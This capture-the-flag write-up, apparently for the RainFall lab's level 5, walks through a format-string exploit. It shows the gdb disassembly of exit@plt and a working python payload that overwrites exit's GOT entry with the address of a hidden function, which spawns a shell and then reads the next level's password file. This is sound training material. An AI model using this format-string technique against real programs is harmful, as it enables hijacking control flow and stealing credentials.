## Context

This exercise is similar to the previous one, except that this time the program makes a call to exit() and therefore never returns.

## Lead

But if we take a closer look at the exit() implementation, we see that the program jumps to an address: 0x8049838. So let's try to overwrite this address!
```
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

## Exploit

We will need to find the address of the o() function and the offset of the buffer in the stack. Using gdb (`info functions`), we find the address of the o() function: 0x080484a4, which is 134513828 in decimal. Finally, we find that the offset of the buffer in the stack is 4, following the same method as for the previous levels. 

We can now craft our input and exploit the program, passing the address we want to overwrite, followed by the good amount of bytes in order to get the decimal value of the o() function address (134513828 - 4):
```
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/exploit
level5@RainFall:~$ cat /tmp/exploit - | ./level5
```
After printing a lot of whitespaces a shell is open and we can display the content of the /home/level6/.pass file. We can now reach to the next level with the command `su level6` and fill in the flag found as a password.